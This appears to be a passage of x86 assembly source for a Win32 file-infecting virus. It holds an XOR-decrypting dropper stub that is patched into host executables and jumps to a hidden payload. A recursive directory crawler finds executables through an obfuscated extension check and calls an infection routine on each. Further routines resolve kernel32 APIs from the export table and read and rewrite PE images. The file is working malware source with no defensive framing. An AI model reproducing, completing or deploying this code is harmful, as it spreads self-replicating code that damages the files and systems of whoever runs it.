_ejce_dropper:                        ; [purpose]            [bytes]                     [offset]     [size]   [operand]        ;
    push    eax                                                                                                                 ; fix
    pusha                             ; entry                \x60                        0             1        N/A             ;
    call    _ejce_dropper_delta       ; Delta                \xe8\x00\x00\x00\x00        1             5        N/A             ;
_ejce_dropper_delta:                                                                                                            ;
    pop     edi                       ; load EIP register    \x5f                        6             1        N/A             ;
    sub     edi, 0fbfbfbfbh           ; Offset-only          \x81\xe7\x00\x00\x00\x00    7             6        Base addr of module
    push    edi                       ; Commit               \x57                        13            1        N/A             ;
    add     edi, 0fafafafah           ; Payload entry        \x81\xc7\x00\x00\x00\x00    14            6        RVA of payload dropper
    mov     edx, 0bfbffbfbh           ; Payload size         \xba\x00\x00\x00\x00        20            5        Size of payload (bytes)
    mov     ebx, 0fcfcfcfch           ; Key                  \xbb\x00\x00\x00\x00        25            5        XOR Key for payload
    xor     ecx, ecx                  ; Clear register       \x33\xc9                    30            2        N/A             ;
@ejce_dropper:                                                                                                                  ;
    mov     eax, [edi + ecx]          ; Move block           \x8b\x04\x39                32            3        N/A             ;
    xor     eax, ebx                  ; XOR Block->key       \x33\xc3                    35            2        N/A             ;
    mov     [edi + ecx], eax          ; Store block          \x89\x04\x39                37            3        N/A             ;
    add     ecx, 4                    ; Next block           \x83\xc1\x04                40            3        N/A             ;
    cmp     ecx, edx                  ; Check counter        \x3b\xca                    43            2        N/A             ;
    jng     @ejce_dropper             ; Jump cond.           \x7e\xf1                    45            2        N/A             ;
    mov     eax, 0fafafafah           ; Jump seq entry       \xb8\x00\x00\x00\x00        47            5        Jump offset     ;
    pop     ebx                       ; Module addr          \x5b                        52            1        N/A             ;
    add     eax, ebx                  ; PHS2 Dropper RVA     \x03\xc3                    53            2        N/A             ;
    jmp     eax                       ; Jump                 \xff\xe0                    55            2        N/A             ;
    ; END DROPPER ;                                          total size: 56                                                     ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


   
;           »»» Stamp dropper values ««« 
_ejce_post_dropper:
    ; Compute base offset
    nop
    mov     DWORD PTR esi, _ejce_alignment_pad_abs      ; Alignment Padding
    xor     ecx, ecx
    dec     ecx
@ejce_post_00:
    inc     ecx
    lodsb
    cmp     BYTE PTR al, 0e8h                           ; Call instruction
    jne     @ejce_post_00                               ; esi = absolute address of jump
    nop
    sub     DWORD PTR esi, _epo_file_buffer                
    mov     DWORD PTR ebx, _epo_code_segment_header
    assume  ebx:ptr IMAGE_SECTION_HEADER
    sub     DWORD PTR esi, [ebx].PointerToRawData
    add     DWORD PTR esi, [ebx].VirtualAddress         ; RVA
    assume  ebx:nothing
    add     esi, 4
    mov     ebx, edi
    mov     DWORD PTR [ebx + EJCE_OFFSET_DELTA], esi    ; Commit to dropper
        
;           »»» Stamp other values ««« 
    mov     ebx, edi                                    ; ebx = dropper
    mov     DWORD PTR eax, _epo_payload_rva             ; eax = RVA
    mov     DWORD PTR [ebx + EJCE_OFFSET_RVA], eax      ; Commit RVA to dropper
    mov     DWORD PTR eax, _ejce_phase_1_key            ; eax = key
    mov     DWORD PTR [ebx + EJCE_OFFSET_KEY], eax      ; Commit key to dropper
    mov     DWORD PTR eax, _epo_payload_size            ; eax = payload size
    ;add    eax, 16                                     ; adjust...
    mov     DWORD PTR [ebx + EJCE_OFFSET_SIZE], eax     ; Commit size to dropper
    
;           »»» Compute payload jump ««« 
    push    ebx
    mov     DWORD PTR ebx, _epo_last_seg                ; Last section header
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, _epo_payload_offset
    sub     DWORD PTR eax, [ebx].PointerToRawData
    add     DWORD PTR eax, [ebx].VirtualAddress         ; eax = RVA of shellcode entry
    assume  ebx:nothing
    pop     ebx                                         ; dropper
    dec     eax                                         ; adjust
    mov     DWORD PTR [ebx + EJCE_OFFSET_JUMP], eax     ; Commit    
    
;           »»» Link EJCE Chain to dropper ««« 
    ; Find final PRI chain
    mov     ebx, esp                                    ; ebx = first chain
    mov     edx, _ejce_jump_chains
    dec     edx
    assume  ebx:ptr ejce_chain
    sub     ebx, SIZEOF ejce_chain
@@EJCE_08:
    add     ebx, SIZEOF ejce_chain
    mov     DWORD PTR eax, [ebx].pri                    ; Load pri value
    cmp     eax, edx                                    ; should be last pri
    jne     @@EJCE_08
    
;           »»» Load 'n' value to eax ««« 
    mov     DWORD PTR eax, [ebx].n                      ; Load
    assume  ebx:nothing
    mov     DWORD PTR ebx, EJCE_CHAIN_FRAME_SIZE
    mul     ebx
    add     DWORD PTR eax, _ejce_alignment_pad_abs
    add     eax, 10                                     ; Align to instruction
    push    eax
    mov     DWORD PTR ebx, _ejce_phase_1_dropper_abs
    sub     eax, ebx                                    ; Offset to dropper code
    pop     ebx
    inc     ebx                                         ; mode to jump operand
    neg     eax
    sub     eax, 8                                      ; NOP Sled
    mov     DWORD PTR [ebx], eax                        ; Commit    
    
;           »»» Realign stack ««« 
_realign:
    mov     eax, SIZEOF ejce_chain
    mov     ebx, _ejce_jump_chains
    inc     ebx
    mul     ebx
    add     esp, eax
    pop     eax
    mov     DWORD PTR ebx, _ejce_return_rva             ; Return value
    add     esp, EPO_STACK_SIZE
    mov     DWORD PTR eax, EPO_ERROR_SUCCESS            ; Return success
    pop     ebp
    ret
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

_epo_no_align_buffer:
    ; Alignment buffer isn't suitable, return error
    ; NOTE: this happens if there is not enough alignment padding in the exec segment, so the 
    ; droppers cannot install
    ; 0xcccccccc
    
    ; hax    
    mov     DWORD PTR eax, EPO_ERROR_NO_ALIGN
    add     esp, EPO_STACK_SIZE
    pop     ebp
    ret

_epo_binary_anomaly:
    mov     DWORD PTR eax, EPO_BINARY_ANOMALY
    add     esp, EPO_STACK_SIZE
    pop     ebp
    ret

_epo_error_no_call:
    ; 0xbbbbbbbb
    mov     DWORD PTR eax, EPO_ERROR_NO_CALL
    add     esp, EPO_STACK_SIZE
    pop     ebp
    ret
    
_ejce_error_max_chains:
    mov     DWORD PTR eax, EPO_ERROR_CHAIN_LIM
    add     esp, EPO_STACK_SIZE
    pop     ebp
    ret

_epo_error_header:
    ; 0xaaaaaaaa
    mov     DWORD PTR eax, EPO_ERROR_HEADER
    add     esp, EPO_STACK_SIZE
    pop     ebp
    ret
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;





; »»»SUBROUTINE: DIRECTORY TRAVERSAL»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
; eax = IN (Search String)                                                                                                      ;
;                                                                                                                               ;
; calls: _infect                                                                                                                ;
;                                                                                                                               ;
; NOTE: Subroutine builds new stack frame                                                                                       ;
; Allocated Memory Pool Pointers:                                                                                               ;
;    _seek_win32finddata_ptr                                                                                                    ;
;    _seek_absolute                                                                                                             ;
;    seek_struct.buffer                                                                                                         ;
;    seek_struct.fdata                                                                                                          ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

_routine_seek:
    push    ebp
    mov     ebp, esp                                    ; Setup stack frame
    sub     esp, SEEK_STACK_SIZE                        ; Reserve space
    push    SEEK_STRUCT_LIMIT                           ; Placeholder for bottom of subroutine stack
    mov     DWORD PTR _fpool, eax                       ; Save function pointer pool
    mov     DWORD PTR _seek_directory_string, esi       ; Save string 
    push    esi   
    xchg    esi, edi
    
;           »»» Create absolute path buffer ««« 
    ALLOC_MEM SEEK_STATIC_PAGE
    mov     DWORD PTR _seek_absolute, eax               ; Commit to stack
    
;           »»» Append wildcard to string ««« 
    xor     al, al
    xor     ecx, ecx
    dec     ecx
    repne   scasb                                       ; Get length of string
    dec     edi                                         ; Adjust 
    mov     DWORD PTR [edi], 02a2e2a5ch                 ; "\*.*"
    
;           »»» Create first cell ««« 
    pop     edx
    CREATE_CELL
    
;           »»» Set string to first cell ««« 
    mov     eax, esp
    assume  eax:ptr seek_struct
    mov     [eax].buffer, edx
    assume  eax:nothing
    
;           »»» Get first two files [., ..] ««« 
    ALLOC_MEM SEEK_STATIC_PAGE                          ; Alloc/zero struct
    mov     ebx, esp
    assume  ebx:ptr seek_struct
    mov     DWORD PTR [ebx].fdata, eax
    mov     DWORD PTR _seek_win32finddata_ptr, eax      ; Commit to stack (free later)
    push    eax                                         ; lpFindFileData
    push    _seek_directory_string                      ; Directory to search
    API_CALL f_findfirstfile               
    cmp     DWORD PTR eax, 0                            ; FindFirstFile returned 0?
    jne     _seek_contd
    add     esp, 030h                                   ; Normalize
    pop     ebp                                         ; Restore previous frame pointer
    ret                                                 ; Return
_seek_contd:           
    assume  ebx:ptr seek_struct
    mov     ebx, esp
    mov     DWORD PTR [ebx].handle, eax
    assume  ebx:nothing
    ;FREE_MEM _seek_directory_string                    ; Free string pool (do this after subroutine completes)
    FINDNEXTFILE                                        ; Traverse to ..

;           »»» Begin traversal loop ««« 
@seek_main:
    SLEEP   SEEK_SLEEP_BEFORE_NEXT
    FINDNEXTFILE                                        ; Move to next file
    cmp     DWORD PTR eax, 0                            ; Returned Error? move to previous directory
    je      _routine_seek_null
    ; FIXME!!
    
;           »»» Zero reserved fields «««   
    mov     DWORD PTR eax, _seek_win32finddata_ptr
    assume  eax:ptr WIN32_FIND_DATA
    mov     DWORD PTR [eax].dwReserved1, 0
    mov     DWORD PTR [eax].dwReserved0, 0
    assume  eax:nothing 
    
;           »»» Test WIN32_FIND_DATA ««« 
    mov     ebx, esp
    assume  ebx:ptr seek_struct
    mov     edi, [ebx].fdata
    mov     DWORD PTR eax, [edi]                        ; WIN32_FIND_DATA->dwFileAttributes (DWORD)
    and     eax, 0f0h
    shr     eax, 4
    dec     eax                                         ; Decrease to 0x0
    test    al, al                                      ; If true, the file is a directory
    je      _seek_directory_found
    add     edi, 44                                     ; WIN32_FIND_DATA->cFileName
    xor     eax, eax
    push    eax
    pop     ecx                                         ; Zero eax, ecx registers
    dec     ecx
    cld
    repne   scasb                                       ; Find length of string
    neg     ecx
    dec     ecx
    mov     BYTE PTR al, 02eh                           ; '.'
    std
    dec     edi
    repne   scasb                                       ; Shift to extension
    cld
    cmp     ecx, 0                                      ; Does the filename have a '.'?
    je      @seek_main                                  ; If there is no extension, skip to next file
    inc     edi                                         ; Shift to .
    mov     DWORD PTR eax, [edi]                        ; Move extension to eax register
    xor     eax, 0fabcef5ah                             ; XOR with key
    cmp     DWORD PTR eax, 09fc48a74h                   ; Test extension
    jne     @seek_main                                  ; Not an executable
    
;           »»» Zero string buffer ««« 
    mov     eax, _seek_absolute
    mov     DWORD PTR ecx, MAX_STRING_SIZE
    call    _routine_zero_memory                        ; Zero the buffer
    
;           »»» Copy Directory ««« 
    mov     ebx, esp
    assume  ebx:ptr seek_struct
    mov     DWORD PTR edi, [ebx].buffer
    xor     al, al
    xor     ecx, ecx                                    ; Zero cl/al
    dec     ecx
    cld
    repne   scasb
    neg     ecx                                         ; ecx = length of directory string
    and     edi, 0ffff0000h                             ; Remove offset
    mov     DWORD PTR esi, _seek_absolute
    xchg    esi, edi
    rep     movsb                                       ; Copy string
    sub     edi, 5
    mov     DWORD PTR [edi], 0                          ; Remove wildcard
    
;           »»» Append File Name, edi = directory string eol ««« 
    push    edi                                         ; Save temp
    mov     edi, [ebx].fdata                            ; WIN32_FIND_DATA
    assume  edi:ptr WIN32_FIND_DATA
    lea     edi, [edi].cFileName                        ; address of cFileName member
    assume  edi:nothing
    xor     ecx, ecx
    dec     ecx
    repne   scasb                                       ; ecx = len of string
    nop
    pop     esi
    xchg    esi, edi
    sbb     edi, ecx
    dec     edi
    neg     ecx
    std
    rep     movsb                                       ; append file name
    cld
    and     edi, 0ffff0000h                             ; Align to page
    mov     esi, edi                                    ; Move string to esi register
    ;mov    eax, _fpool                                 ; Move function pointer pool to eax register
    
;           »»» Call Infection routine ««« 
    SEEK_BREAK
    mov    eax, OPT_INFECT                              ; Call the infection routine?
    .IF eax==1
        mov     eax, _fpool
        call    _routine_infect_image                   ; Infect File
    .ENDIF
    
;           »»» Return to loop ««« 
    jmp     @seek_main

_routine_seek_null:

;           »»» Free Buffers ««« 
    mov     ebx, esp
    assume  ebx:ptr seek_struct
    mov     DWORD PTR eax, [ebx].fdata
    FREE_MEM eax                                        ; free WIN32_FIND_DATA page
    mov     DWORD PTR eax, [ebx].buffer                    
    FREE_MEM eax                                        ; free directory string buffer

;           »»» Close Handle ««« 
    push    DWORD PTR [ebx].handle
    API_CALL f_findclose

    SLEEP   10
    
;           »»» Remove struct & test limit ««« 
    add     DWORD PTR esp, SIZEOF seek_struct
    mov     DWORD PTR eax, [esp]
    cmp     DWORD PTR eax, SEEK_STRUCT_LIMIT            ; Is this the final struct?
    je      _seek_completed                             ; Return from procedure
    
;           »»» Continue main procedure ««« 
    jmp        @seek_main

_seek_directory_found:
;           »»» Create new cell ««« 
    CREATE_CELL

;           »»» Allocate memory for directory string ««« 
    ALLOC_MEM SEEK_STATIC_PAGE
    mov     ebx, esp
    assume  ebx:ptr seek_struct
    mov     DWORD PTR [ebx].buffer, eax
    
;           »»» Allocate Memory for find data ««« 
    ALLOC_MEM SEEK_STATIC_PAGE
    mov     DWORD PTR [ebx].fdata, eax
    
;           »»» Generate Directory String ««« 
    mov     esi, [esp + SIZEOF seek_struct + 4]
    mov     edi, esi
    xor     al, al
    xor     ecx, ecx
    dec     ecx
    cld
    repne   scasb
    neg     ecx
    mov     DWORD PTR edi, [ebx].buffer
    rep     movsb                                       ; Copy string
    sub     edi, 5
    mov     DWORD PTR [edi], 0                          ; Remove wildcard
    mov     DWORD PTR edx, [esp + SIZEOF seek_struct + 8] ; WIN32_FIND_DATA
    assume  edx:ptr WIN32_FIND_DATA
    push    edi                                         ; Save ptr to string NULL
    lea     DWORD PTR edi, [edx].cFileName
    xor     ecx, ecx
    dec     ecx
    repne   scasb                                       ; Determine length of folder name string
    neg     ecx
    dec     ecx
    nop
    mov     esi, edi
    sub     esi, ecx
    pop     edi
    rep     movsb                                       ; Copy directory string to form absolute path
    dec     edi
    mov     DWORD PTR [edi], "*.*\"
    
;           »»» Call FindFirstFile/FindNextFile ««« 
    mov     DWORD PTR eax, [ebx].fdata
    push    eax
    and     edi, 0ffff0000h
    push    edi
    API_CALL f_findfirstfile                            ; .
    mov     DWORD PTR [ebx].handle, eax                 ; Commit handle
    SLEEP   SEEK_SLEEP_BEFORE_NEXT
    FINDNEXTFILE                                        ; ..    
    assume  edx:nothing
    assume  ebx:nothing
    jmp     @seek_main                                  ; Loop
    
_seek_completed:

;           »»» Normalize stack ««« 
    pop     eax                                         ; remove placeholder
    ;FREE_MEM _seek_absolute
    add     esp, SEEK_STACK_SIZE                        ; Remove variables
    pop     ebp                                         ; previous stack frame
    ret                                                 ; Return from procedure    
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;





; »»»SUBROUTINE: RESOLVE API»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
; WARNING: RESOLVE API WILL CLEAR GENERAL PURPOSE REGISTERS
_routine_resolve_api: 
    nop
    mov     DWORD PTR _api_input_parameter, eax         ; Save to stack 
    mov     DWORD PTR ebx, _kernel32_base_address
    xor     eax, eax                                    ; zero
    mov     WORD PTR ax, [ebx]                          ; move MZ to ax register
    
    cmp     WORD PTR ax, 05a4dh                         ; test header
    jne     _routine_resolve_fail
    add     ebx, [ebx + 3ch]                            ; IMAGE_NT_HEADERS (PE)
    mov     WORD PTR ax, [ebx]                          ; load PE
    cmp     WORD PTR ax, 04550h                         ; test PE header
    jne     _routine_resolve_fail
    mov     DWORD PTR _api_pe_header, ebx               ; Commit to stack
    mov     DWORD PTR eax, [ebx + 78h]                  ; OptionalHeader.DataDirectory[0].VirtualAddress
    add     DWORD PTR eax, _kernel32_base_address       ; Absolute virtual address to EAT
    mov     DWORD PTR _api_eat_absolute, eax            ; Commit to stack
    mov     eax, [eax + 20h]                            ; AddressOfNames [RVA]
    add     DWORD PTR eax, _kernel32_base_address       ; AddressOfNames [Absolute]
    mov     DWORD PTR _api_addressofnames, eax          ; Commit to stack
    cmp     DWORD PTR _api_input_parameter, 0           ; test if NULL
    je      _routine_resolve_all                        ; Jump to secondary routine  
    
;           »»» Crawler for VirtualAlloc ««« 
    mov     DWORD PTR edx, _api_eat_absolute            ; Set register
    xor     ecx, ecx                                    ; Zero ecx register
@_api_l0:
    cmp     DWORD PTR ecx, [edx + 18h]                  ; Test NumberOfNames
    jge     _routine_resolve_fail                       ; Error if ecx exceeds NumberOfNames
    mov     DWORD PTR ebx, _api_addressofnames          ; Load
    mov     ebx, [ebx + ecx * 4]                        ; RVA of string
    add     ebx, _kernel32_base_address                 ; Absolute address of string
    
;           »»» Test String ««« 
    push    ecx                                         ; save register
    xor     ecx, ecx                                    ; Set NULL
    mov     esi, ebx                                    ; kernel32 string
    mov     edi, _api_input_parameter                   ; Call string
    call    _routine_test_string                        ; Compare strings
    pop     ecx
    inc     ecx
    cmp     eax, 0
    je      @_api_l0
    mov     DWORD PTR eax, _api_eat_absolute
    mov     eax, [eax + 24h]                            ; AddressOfNameOrdinals
    add     DWORD PTR eax, _kernel32_base_address       ; Absolute
    xor     ebx, ebx
    dec     ecx
    mov     WORD PTR bx, [eax + ecx * 2]
    mov     DWORD PTR eax, _api_eat_absolute
    mov     eax, [eax + 1ch]                            ; AddressOfFunctions
    add     eax, _kernel32_base_address    
    mov     eax, [eax + ebx * 4]
    add     eax, _kernel32_base_address
    ret    
_routine_resolve_all:
    nop
    mov     DWORD PTR esi, _shellcode_string_pool
    mov     DWORD PTR _api_string_index, esi            ; Commit
    mov     DWORD PTR eax, _fpool
    mov     DWORD PTR _api_pool_index, eax              ; Commit
    xor     ecx, ecx
    mov     DWORD PTR edx, _api_eat_absolute
@_api_l1:
    cmp     DWORD PTR ecx, [edx + 18h]                  ; Test NumberOfNames
    jge     _routine_resolve_fail                       ; Error if ecx exceeds NumberOfNames
    mov     DWORD PTR ebx, _api_addressofnames          ; Load
    mov     ebx, [ebx + ecx * 4]                        ; RVA of string
    add     ebx, _kernel32_base_address                 ; Absolute address of string

;           »»» Test String ««« 
    push    ecx                                         ; save register
    xor     ecx, ecx                                    ; Set NULL
    mov     esi, ebx                                    ; kernel32 string
    mov     edi, _api_string_index                      ; Call string
    call    _routine_test_string                        ; Compare strings
    pop     ecx
    inc     ecx
    cmp     eax, 0
    je      @_api_l1
    mov     DWORD PTR eax, _api_eat_absolute
    mov     eax, [eax + 24h]                            ; AddressOfNameOrdinals
    add     DWORD PTR eax, _kernel32_base_address       ; Absolute
    xor     ebx, ebx
    dec     ecx
    mov     WORD PTR bx, [eax + ecx * 2]
    mov     DWORD PTR eax, _api_eat_absolute
    mov     eax, [eax + 1ch]                            ; AddressOfFunctions
    add     eax, _kernel32_base_address    
    mov     eax, [eax + ebx * 4]
    add     eax, _kernel32_base_address
    
;           »»» Commit to pool ««« 
    mov     DWORD PTR ebx, _api_pool_index
    mov     DWORD PTR [ebx], eax                        ; Save to pool
    add     ebx, 4                                      ; increment pointer
    mov     DWORD PTR _api_pool_index, ebx              ; Commit to stack
    
;           »»» Locate next string ««« 
    mov     DWORD PTR esi, _api_string_index
@_api_l2:
    lodsb
    test    al, al
    jne     @_api_l2
    nop
    mov     DWORD PTR _api_string_index, esi            ; Commit
    ;inc     esi
    xor     ecx, ecx
    cmp     BYTE PTR [esi], 090h                        ; Test for end
    jne     @_api_l1
    xor     eax, eax
    inc     eax
    ret
_routine_resolve_fail:
    mov        DWORD PTR eax, _fpool                        ; error out
    ; > This should never occur...
    BREAK
; »»»SUBROUTINE: RESOLVE API»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;





                        
; »»»SHARED SUBROUTINES»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

; SUBROUTINE: READ IMAGE INTO BUFFER ;
; eax: in (absolute image path)
; eax: out (buffer address)
; ecx: out (RAW Image Size)
; ebx: out (file handle)
; ERROR CODES: 0x0 = FAILED (eax)
_routine_load_image:
    push    NULL                                        ; hTemplateFile
    push    FILE_ATTRIBUTE_NORMAL                       ; dwFlagsAndAttributes
    push    OPEN_EXISTING                               ; dwCreationDisposition
    push    NULL                                        ; lpSecurityAttributes
    push    FILE_SHARE_WRITE                            ; dwShareMode
    mov     ebx, GENERIC_READ
    xor     ebx, GENERIC_WRITE
    push    ebx                                         ; dwDesiredAccess
    push    eax                                         ; lpFileName
    API_CALL f_createfile
    cmp     DWORD PTR eax, -1                           ; Returned Error?
    je      _routine_load_image_fail
    push    eax                                         ; Save file handle
    push    0                                           ; lpFileSizeHigh
    push    eax                                         ; Handle
    API_CALL f_getfilesize
    cmp     eax, 0                                      ; File size 0?
    je      _routine_load_image_zero
    cmp     DWORD PTR eax, READ_MAX_IMAGE_SIZE          ; Larger than 128MB?
    jg      _routine_load_size_exceed                   ; Return error if greater than max value
    add     DWORD PTR eax, READ_IMAGE_APPEND_SIZE
    push    eax                                         ; Save file size
    ALLOC_MEM eax                                       ; eax = buffer
    pop     ecx                                         ; FileSize
    pop     edx                                         ; file handle
    push    edx
    push    eax                                         ; save buffer
    push    0                                           ; Cell of space (not apart of function)
    mov     edi, esp
    push    0                                           ; lpOverLapped
    push    edi                                         ; lpNumberOfBytesRead
    push    ecx                                         ; nNumberOfBytesToRead
    push    eax                                         ; buffer
    push    edx                                         ; File Handle
    API_CALL f_readfile
    test    al, al
    je      _routine_load_image_fail
    ;mov        eax, [esp + 8]
    ;push    eax
    ;API_CALL f_closehandle 
;           »»» Set file pointer ««« 
    push    FILE_BEGIN                                  ; dwMoveMethod
    push    NULL
    push    NULL
    push    [esp + 20]
    API_CALL f_setfilepointer

;           »»» Function epilogue ««« 
    pop     ecx                                         ; Image Size
    pop     eax                                         ; Buffer
    pop     ebx                                         ; Handle
    ret
_routine_load_image_fail:
    xor     eax, eax                                    ; NULL returns error
    ret
_routine_load_image_zero:
    pop     eax
    xor     eax, eax
    ret
_routine_load_size_exceed:
    pop     eax
    xor     eax, eax
    ret
; END SUBROUTINE ;

; SUBROUTINE: WRITE IMAGE TO BUFFER ;
; eax: in (file handle)
; ebx: in (image buffer)
; ecx: in (image length)
; eax: out (error code)
; ERROR CODES: 0x0 = FAILED (eax)
_routine_write_image:
    ;BOOL WINAPI WriteFile(
    ;  __in         HANDLE hFile,
    ;  __in         LPCVOID lpBuffer,
    ;  __in         DWORD nNumberOfBytesToWrite,
    ;  __out_opt    LPDWORD lpNumberOfBytesWritten,
    ;  __inout_opt  LPOVERLAPPED lpOverlapped
    ;);
    
    push    0                                            ; Variable to store lpNumberOfBytesWritten
    mov     edx, esp    
    
    push    NULL                                        ; lpOverlapped
    push    edx                                         ; lpNumberOfBytesWritten
    push    ecx                                         ; nNumberOfBytesToWrite
    push    ebx                                         ; lpBuffer
    push    eax                                         ; hFile
    API_CALL f_writefile
    cmp     DWORD PTR eax, 1                            ; Return success?
    jne     _routine_write_image_failed
    add     esp, 4
    ret
_routine_write_image_failed:
    pop     eax
    xor     eax, eax
    ret
; END SUBROUTINE ;

; SUBROUTINE: TEST STRINGS ;
; esi: in (string0)
; edi: in (string1)
; ecx: max count or disregard (unused)
_routine_test_string:
    pusha
    xor     ecx, ecx
    push    ecx
    pop     eax
_routine_test_string_l0:
    mov     BYTE PTR al, [esi + ecx]
    shl     eax, 8
    mov     BYTE PTR al, [edi + ecx]
    inc     ecx
    cmp     BYTE PTR al, ah
    jne     _routine_test_string_nomatch
    cmp     al, 0
    jne     _routine_test_string_l0
    popa
    xor     eax, eax
    inc     eax
    ret
_routine_test_string_nomatch:
    popa
    xor     eax, eax
    ret
; END SUBROUTINE ;

; SUBROUTINE: ZERO MEMORY ;
; eax: in (address of pool)
; ecx: in (count)
; *register and EFLAGS states preserved
_routine_zero_memory:
    nop
    pushf
    pusha
    mov     ebx, eax                                    ; ebx is pointer to buffer
_routine_zero_memory_l0:
    mov     BYTE PTR [ebx], 0                           ; move 0 to buffer
    inc     ebx
    loop    _routine_zero_memory_l0
    popa
    popf
    ret
; END SUBROUTINE;

; SUBROUTINE: CRASH PROGRAM ;
_routine_crash:
    xor     eax, eax
    inc     eax
    jmp     eax
; END SUBROUTINE ;

; SUBROUTINE: GENERATE 32-BIT PSEUDORANDOM KEY ;
; eax: out (key)
_routine_gen_key:
    nop
    push    edx
    rdtsc
    add     eax, edx
    xor     eax, ebx
    xor     eax, ecx
    xor     eax, ebp
    xor     eax, esp
    push    eax
    rdtsc
    pop     edx
    xor     eax, edx    
    ;mov    eax, 0fafafafah                                ; DEBUG
    pop     edx
    ret
; END SUBROUTINE ;

; SUBROUTINE: COMPUTE SHELLCODE LENGTH ;
; ecx: out (length)
; eax: out (absolute address)
_routine_compute_shellcode_length:
    call    _routine_compute_shellcode_length_delta
_routine_compute_shellcode_length_delta:
    pop     ebx                                            ; delta
_routine_compute_shellcode_length_l0:
    dec     ebx
    mov     BYTE PTR al, [ebx]
    cmp     BYTE PTR al, 'L'
    jne     _routine_compute_shellcode_length_l0
    mov     DWORD PTR eax, [ebx]
    cmp     DWORD PTR eax, 'MMIL'
    jne     _routine_compute_shellcode_length_l0
    sub     ebx, DELTA_REALIGNMENT                        ; Realign
    xor     ecx, ecx
    dec     ecx
_routine_compute_shellcode_length_l1:
    inc     ecx
    mov     BYTE PTR al, [ebx + ecx]
    cmp     BYTE PTR al, 'L'
    jne     _routine_compute_shellcode_length_l1
    mov     DWORD PTR eax, [ebx + ecx]
    xor     eax, 03fab59c2h
    cmp     DWORD PTR eax, 07ae6188eh
    jne     _routine_compute_shellcode_length_l1
    add     ecx, 4
    mov     eax, ebx
    ret
; END SUBROUTINE ;

; SUBROUTINE: RANG32 ;
; Note: this procedure is pr0mix's work from the win32.atix virus
RANG32:                                                                            
    pushad                                              ;ñîõðàíÿåì ðåãèñòðû                                                                     
    mov     ecx, dword ptr [esp+24h]                    ;ecx=÷èñëî, ÷òî ïåðåäàëè â ñòýêå
    db      0fh, 31h                                      
    imul    eax, eax, 1664525                           ;èäóò ðàçíûå âû÷èñëåíèÿ äëÿ ïîëó÷åíèÿ                                                   
    add     eax, 1013904223                             ;áîëåå ñëó÷àéíîãî ÷èñëà 
    add     eax, edx
    adc     eax, esp 
    rcr     eax, 16                                  
    imul    eax, [esp+32] 
    xor     edx, edx     
    mul     ecx                                         ;mul äåéñòâóåò êàê div 
    mov     dword ptr [esp+1ch], edx                                            
    popad                                                                      
    ret     04
; END SUBROUTINE ;

; SUBROUTINE: ALLOCATE MEMORY ;
; eax: in   (size)
; eax: out  (page aligned address)
_routine_allocate_memory:
    push    ebx
    push    eax                                         ; Commit size to stack
    push    PAGE_READWRITE                              ; R/W Permissions on Page
    mov     ebx, MEM_COMMIT
    xor     ebx, MEM_RESERVE
    push    ebx
    push    eax                                         ; Size of memory pool
    push    0    
    API_CALL    f_virtualalloc                          ; eax = page boundry
    pop     ecx                                         ; ecx = size of allocated boundry
    push    eax                                         ; Save address on stack
    call    _routine_zero_memory                        ; zero pool
    pop     eax                                         ; return address in eax
    pop     ebx
    ret
; END SUBROUTINE ;

; SUBROUTINE: BYTE COPY ;
; ecx: in (offset/size)
; edi: in (destination)
; esi: in (source)
_routine_byte_copy:
    nop
    pusha
    mov     edx, ecx
    xor     ecx, ecx
    dec     ecx
_routine_byte_copy_l0:
    inc     ecx
    cmp     edx, ecx
    jng     _routine_byte_copy_end
    mov     BYTE PTR al, [esi + ecx]
    mov     BYTE PTR [edi + ecx], al
    jmp     _routine_byte_copy_l0
_routine_byte_copy_end:
    popa
    ret
; END SUBROUTINE ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;




; »»»STRINGS»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
; String Pool Signature
string_pool:
byte    'P'
byte    'O'
byte    'O'
byte    'L'

